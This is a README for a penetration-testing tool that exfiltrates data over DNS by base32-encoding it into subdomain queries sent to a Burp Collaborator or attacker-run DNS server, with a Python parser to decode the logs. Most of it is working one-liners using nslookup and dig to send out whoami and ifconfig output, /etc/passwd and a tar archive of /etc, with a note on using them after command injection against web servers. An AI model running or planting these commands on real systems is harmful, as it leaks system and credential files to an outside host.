# DNS-Exfiltrate

Parses bind query logs or private Burp Collaborator output to decode exfiltrated data. 

Burp Collaborator allows prepending hostnames to the provided address. For example: assume this is your collaborator address: `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`

You may prepend 'hostnames' (maximum length of a DNS label is 63 bytes), assuming it uses characters safe in a DNS query (such as base32-encoded data, see below). You may also prepend multiple hostnames, as long as the entire request is 253 bytes or less. This allows exfiltration (including blind exfiltration) of data via DNS. Works best with a private Burp Collaborator server (or any DNS server that logs queries). You may also do this with a public server and a sniffer such as tcpdump (no DNS server required). I plan to add pcap support in the future.

Exfiltrate the base32-encoded output from `whoami` via Burp Collaborator:

Command:

`a=$(whoami|base32|tr -d =);nslookup $a.q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`

Burp Collaborator response:

`O53XOLLEMF2GCCQ.q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`

![Screen Shot 2023-01-10 at 2 59 05 PM](https://user-images.githubusercontent.com/14989334/211650128-5d6a8562-3d64-4ec8-b530-bc47ae5a0db0.png)

`dns-parse.py` parses native bind query logs, or private Burp Collaborator output, which may be logged via `tee` (requires "logLevel" : "DEBUG" in collaborator.config):

```
java -jar /root/collaborator/burpsuite_pro.jar --collaborator-server | tee /root/collaborator/collaborator.log
```

Assumes hostnames are encoded in base32 (`A-Z`, `2-7`), which is the most efficent native encoding utility (on most Linux/Unix systems) that is safe for DNS queries. The `=` character (used to pad base32-encoded data to an 8 byte boundary) is not DNS safe, but can be trimmed using `tr -d =` on Linux/Unix systems. `dns-parse.py` appends any missing `=` characters.

Hex encoding is also safe for DNS queries (but is less efficient). I may add hex support in the future. base64 does not work due to `/` and `+`.

Thanks and credit to [Xavier Mertens](https://www.sans.org/profiles/xavier-mertens/) for his excellent [Internet Storm Center](https://isc.sans.edu/) post: [DNS Query Length... Because Size Does Matter](https://isc.sans.edu/diary/DNS+Query+Length...+Because+Size+Does+Matter/22326)

## Use cases (bash):

Note that if results are unreliable you can specify the name or IP of the DNS server via `dig @`...

In the examples below: `<DNS Name>` is the random name provided by Burp Collaborator (AKA, the interaction ID). For example: use `q3uv485lz802ad6a7xz6c2izvq1hp6` if your Beef Collaborator address is `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`.

### Send STDOUT from a command:

```
ifconfig | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
```

Decode the output:

```
./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
```

### Exfiltrate a file:

```
base32 -w 63 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
```

Decode the file:

```
./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d
```

### Exfiltrate a compressed file:

```
gzip - < /etc/passwd | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
```

Decode/unzip the file:

```
./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d | zcat
```

### Exfiltrate a compressed tar archive of a directory:

Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It took 35 minutes, requiring 45,382 DNS requests, resulting in a 1.8 megabyte tar.gz file. Needless to say: the files/directories contained in the archive are restricted by the permissions of the running user. For command injection on web sites (using an account such as apache or www-data), many files/directories will likely be missing.

```
tar czf - /etc | base32 -w 63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
```

Decode/save the tar archive:

```
./dns-parse.py <DNS Name> (query.log|collaborator.log) | base32 -d > exfiltrated.tgz
```

## Sample Logs

[collaborator1.log](collaborator1.log) (STDOUT exfiltration):

```
/dns-parse.py qysipx9bbnhv0u5ez2dkmzuh68cy0n collaborator1.log | base32 -d
```

[collaborator2.log](collaborator2.log) (/etc/passwd exfiltration):

```
/dns-parse.py 165cmzb1cu1m3wso0k1k3udr7id91y collaborator2.log | base32 -d 
```

[collaborator3.log](collaborator3.log) (gzipped /etc/passwd exfiltration):

```
/dns-parse.py l9vn8f4xr94q4f8j3t6ba8i5bwhm5b collaborator3.log | base32 -d | zcat
```
